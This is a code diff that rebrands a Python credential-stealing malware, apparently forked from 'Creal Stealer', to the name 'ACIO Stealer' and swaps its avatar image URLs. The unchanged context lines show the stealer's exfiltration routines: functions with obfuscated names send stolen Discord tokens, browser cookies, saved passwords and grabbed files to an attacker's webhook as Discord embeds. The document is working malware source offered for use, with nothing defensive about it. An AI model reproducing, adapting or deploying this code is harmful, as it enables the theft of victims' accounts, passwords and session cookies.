@@ -420,16 +420,16 @@ def upl05dT4k31(t0k3n, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "Creal Stealer",
-                "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
+                "text": "ACIO Stealer",
+                "icon_url": "https://imgur.com/pbkXJZh.png"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
-        "username": "Creal Stealer",
+        "avatar_url": "https://imgur.com/pbkXJZh.png",
+        "username": "ACIO Stealer",
         "attachments": []
         }
     L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
@@ -457,17 +457,17 @@ def upload(name, link):
             "content": f"{globalInfo()}",
             "embeds": [
                 {
-                    "title": "Creal | Cookies Stealer",
+                    "title": "ACIO | Cookies Stealer",
                     "description": f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{rb}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealCookies.txt]({link})",
                     "color": 2895667,
                     "footer": {
-                        "text": "Creal Stealer",
-                        "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
+                        "text": "ACIO Stealer",
+                        "icon_url": "https://imgur.com/pbkXJZh.png"
                     }
                 }
             ],
-            "username": "Creal Stealer",
-            "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
+            "username": "ACIO Stealer",
+            "avatar_url": "https://imgur.com/pbkXJZh.png",
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
@@ -483,17 +483,17 @@ def upload(name, link):
             "content": f"{globalInfo()}",
             "embeds": [
                 {
-                    "title": "Creal | Password Stealer",
+                    "title": "ACIO | Password Stealer",
                     "description": f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{ra}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [CrealPassword.txt]({link})",
                     "color": 2895667,
                     "footer": {
-                        "text": "Creal Stealer",
-                        "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
+                        "text": "ACIO Stealer",
+                        "icon_url": "https://imgur.com/pbkXJZh.png"
                     }
                 }
             ],
-            "username": "Creal",
-            "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
+            "username": "ACIO",
+            "avatar_url": "https://imgur.com/pbkXJZh.png",
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
@@ -512,16 +512,16 @@ def upload(name, link):
                     }
                 ],
                 "author": {
-                    "name": "Creal | File Stealer"
+                    "name": "ACIO | File Stealer"
                 },
                 "footer": {
-                    "text": "Creal Stealer",
-                    "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
+                    "text": "ACIO Stealer",
+                    "icon_url": "https://imgur.com/pbkXJZh.png"
                 }
                 }
             ],
-            "username": "Creal Stealer",
-            "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
+            "username": "ACIO Stealer",
+            "avatar_url": "https://imgur.com/pbkXJZh.png",
             "attachments": []
             }
         L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
